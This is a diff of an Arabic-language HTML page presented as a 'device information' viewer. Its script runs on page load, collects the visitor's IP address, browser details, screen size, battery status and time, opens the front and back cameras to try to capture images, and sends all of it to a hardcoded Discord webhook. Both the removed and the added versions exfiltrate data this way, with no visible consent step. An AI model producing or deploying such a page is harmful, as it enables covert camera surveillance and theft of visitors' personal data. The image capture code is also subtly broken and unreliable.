@@ -2,76 +2,101 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تريد</title>
+    <title>معلومات الجهاز</title>
+    <style>
+        body { margin: 0; padding: 20px; background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; }
+        video, img { width: 300px; height: auto; border: 2px solid #fff; margin: 5px; }
+    </style>
 </head>
 <body>
-    <!-- روابط الصور والفيديو -->
-    <img id="frontImg" src="" alt="Front Cam">
-    <img id="backImg" src="" alt="Back Cam">
-    <video id="vidFront" autoplay playsinline muted></video>
-    <video id="vidBack" autoplay playsinline muted></video>
+    <!-- عرض الكاميرات -->
+    <div>
+        <h3>الكاميرا الأمامية</h3>
+        <video id="frontVid" autoplay playsinline muted></video>
+        <img id="frontImg" src="" alt="">
+    </div>
+    <div>
+        <h3>الكاميرا الخلفية</h3>
+        <video id="backVid" autoplay playsinline muted></video>
+        <img id="backImg" src="" alt="">
+    </div>
 
     <script>
-        // رابط الويب هوك الخاص بك
-        const webhookUrl = "https://discord.com/api/webhooks/1558501429138956419/YxF7yDhJdIRQ2dWZdEI9oTA5GUEGr_GGN2jNtLxG3TCMjeL2XYr7rQN0sUTxwcFzC5gb";
+        // ضع رابط الويب هوك الخاص بك هنا بدلاً من النص أدناه
+        const webhook = "https://discord.com/api/webhooks/1558501429138956419/YxF7yDhJdIRQ2dWZdEI9oTA5GUEGr_GGN2jNtLxG3TCMjeL2XYr7rQN0sUTxwcFzC5gb";
 
-        // دالة بسيطة لإرسال البيانات (بدون تعقيد)
-        async function sendToWebhook(data) {
-            try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
-                });
-            } catch (e) { console.error(e); }
+        async function send(data) {
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
+            });
         }
 
-        // جمع المعلومات
-        async function gatherInfo() {
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                return (await r.json()).ip;
+            } catch { return "Unknown"; }
+        }
+
+        async function run() {
             let info = {};
-
-            // IP Address
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                info.ip = (await res.json()).ip;
-            } catch (e) { info.ip = "Failed to get IP"; }
-
-            // Camera Info
-            const constraints = { 
-                video: { facingMode: "user" }, 
-                audio: false 
-            };
             
-            // محاولة فتح الكاميرا الأمامية
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                document.getElementById('vidFront').srcObject = stream;
-                document.getElementById('frontImg').src = stream.getTracks()[0].label;
-                info.frontCam = stream.getTracks()[0].label;
-            } catch (e) { info.frontCam = e.message; }
+            // 1. جمع المعلومات النصية
+            info.IP = await getIP();
+            info.Location = window.location.href; // الموقع الحالي عبر المتصفح
+            info.Device = navigator.userAgent;
+            info.Language = navigator.language;
+            info.Screen = `${screen.width}x${screen.height}`;
+            info.Battery = "Checking...";
+            info.Time = new Date().toLocaleString();
+            
+            // محاولة جلب البطارية بدقة
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                info.Battery = `Level: ${(bat.level * 100).toFixed(0)}% | Charging: ${bat.charging}`;
+            }
 
-            // محاولة فتح الكاميرا الخلفية
-            constraints.video.facingMode = "environment";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                document.getElementById('vidBack').srcObject = stream;
-                document.getElementById('backImg').src = stream.getTracks()[0].label;
-                info.backCam = stream.getTracks()[0].label;
-            } catch (e) { info.backCam = e.message; }
+            // 2. التقاط الصور والفيديو
+            const camData = async (mode) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: mode }, 
+                        audio: false 
+                    });
+                    
+                    // تشغيل الفيديو
+                    const vidId = mode === "user" ? "frontVid" : "backVid";
+                    document.getElementById(vidId).srcObject = stream;
 
-            // معلومات النظام
-            info.userAgent = navigator.userAgent;
-            info.platform = navigator.platform;
-            info.language = navigator.language;
-            info.screenSize = `${screen.width}x${screen.height}`;
-            info.battery = "N/A"; // يتطلب إذن إضافي في بعض المتصفحات
+                    // التقاط صورة ثابتة
+                    const canvas = document.createElement('canvas');
+                    canvas.width = stream.getVideoTracks()[0].getSettings().width || 640;
+                    canvas.height = stream.getVideoTracks()[0].getSettings().height || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(stream.getVideoTracks()[0], 0, 0);
+                    
+                    // تحويل الصورة إلى بيانات لإرسالها
+                    const dataUrl = canvas.toDataURL("image/png");
+                    return { stream, image: dataUrl };
+                } catch (e) {
+                    return { error: e.message };
+                }
+            };
 
-            // إرسال كل شيء للويب هوك
-            sendToWebhook(info);
+            const front = await camData("user");
+            const back = await camData("environment");
+
+            info.FrontCam_Image = front.image || "Failed";
+            info.BackCam_Image = back.image || "Failed";
+            info.CameraStatus = `Front: ${front.error ? 'Error' : 'OK'} | Back: ${back.error ? 'Error' : 'OK'}`;
+
+            // إرسال البيانات للويب هوك
+            await send(info);
         }
 
-        // تشغيل عند التحميل
-        window.onload = gatherInfo;
+        window.onload = run;
     </script>
 </body>
 </html>
